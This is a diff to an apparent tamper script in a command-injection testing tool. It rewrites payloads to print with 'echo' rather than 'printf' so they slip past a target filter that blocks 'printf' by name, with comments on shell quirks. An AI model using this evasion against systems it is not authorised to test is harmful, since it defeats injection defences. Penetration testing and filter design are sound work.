@@ -17,9 +17,13 @@ from src.utils import settings
 from src.core.controller import checks
 
 """
-About: Replaces the printf-based ASCII to Decimal `printf '%d' "'$char"` with `echo -n $char | od
-       -An -tuC | xargs`.
+About: Prints with `echo` wherever a payload prints with `printf`, and reads a byte with `echo -n
+       $char | od -An -tuC | xargs` instead of `printf '%d' "'$char"`.
 Notes: This tamper script works against target(s) with a POSIX shell.
+       It is for a target that refuses 'printf' by name. 'echo' is what every payload prints with
+       here, so none of them carries the other name - at a cost: 'echo' reads the backslashes of
+       what it prints as escapes on some shells ('dash' among them) and a leading '-n' as an option
+       on all of them, so an output carrying either may come back changed.
        The two pipes are the one thing this rewrite cannot be written without: 'od' reads a byte
        from its standard input alone, and the only way to hand it one without a pipe is awk's
        'sprintf', which carries the very name this script exists to avoid. So it is written only
@@ -39,12 +43,19 @@ def dependencies():
 if not settings.TAMPER_SCRIPTS[__tamper__]:
   settings.TAMPER_SCRIPTS[__tamper__] = True
 
+# Every payload built from here on prints with 'echo' - said while the scripts are settled, since the
+# builders read it as they build rather than having the result rewritten afterwards.
+def declare():
+  settings.PRINT_WITH_ECHO = True
+
 # Say with 'echo' what the payload said with 'printf'.
 def tamper(payload):
+  declare()
   # A target settled as Windows after this script was accepted: 'cmd.exe' has no 'od' to read with.
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return payload
-  # The byte is handed to 'od' down a pipe, so this is only writable where a pipe is what is proving.
+  # The byte is handed to 'od' down a pipe, so the byte reading is only rewritten where a pipe is what
+  # is proving; the rest of what prints already goes out with 'echo'.
   if checks.current_separator() not in ("|", "||"):
     return payload
   space = checks.current_whitespace()
